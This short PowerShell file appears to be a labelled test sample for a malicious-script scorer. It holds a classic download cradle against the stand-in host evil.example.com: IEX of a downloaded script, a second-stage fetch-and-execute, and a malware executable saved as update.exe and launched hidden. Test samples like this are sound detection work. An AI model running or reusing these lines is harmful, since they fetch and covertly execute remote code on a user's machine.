# Simulated malicious: classic download cradle.
# SAMPLE ONLY — NOT EXECUTED. Should score 50-80+.
IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/payload.ps1')
Invoke-Expression (Invoke-WebRequest -Uri 'http://evil.example.com/stage2.ps1' -UseBasicParsing).Content
$wc = New-Object System.Net.WebClient
$wc.DownloadFile('http://evil.example.com/malware.exe', "$env:TEMP\update.exe")
Start-Process "$env:TEMP\update.exe" -WindowStyle Hidden
